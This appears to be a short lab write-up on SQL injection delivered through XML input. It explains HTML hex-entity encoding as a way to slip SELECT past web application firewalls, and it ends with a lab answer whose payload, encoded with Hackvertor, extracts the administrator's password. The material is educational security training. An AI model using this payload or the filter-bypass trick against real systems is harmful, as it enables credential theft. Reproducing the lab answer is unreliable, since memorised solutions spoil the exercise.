📍 Where else can SQL injection happen?
You can inject SQL wherever user input reaches the database. For example:

Forms (like login or search fields)

Cookies

Headers (like User-Agent, Referer)

JSON data

XML data

API requests

If the backend reads that input and puts it into an SQL query — it's injectable!

🧪 Example: SQL injection in XML
Here’s a piece of XML sent to the server:

xml
Copy
Edit
<stockCheck>
    <productId>123</productId>
    <storeId>999 &#x53;ELECT * FROM users</storeId>
</stockCheck>
Notice the weird part:

bash
Copy
Edit
&#x53;ELECT
That is:

&#x53; → Unicode for S

So &#x53;ELECT becomes SELECT

The server decodes it before executing, so the full SQL becomes:

sql
Copy
Edit
SELECT * FROM users
😈 Why use encoding tricks?
To bypass firewalls or filters that block obvious attacks like:

SELECT * FROM users WHERE ...
They won’t recognize &#x53;ELECT as SELECT, but the server will decode it and run it.

ANSWER TO LAB

Just encode the sql query
for this lab i have used rightClick->Extenstions->Hackvetor->Encode->hex_entities

<stockCheck>
<productId>
1
</productId>
<storeId>
<@hex_entities>
1 union SELECT password from users where username='administrator'
</@hex_entities>
</storeId>
</stockCheck>
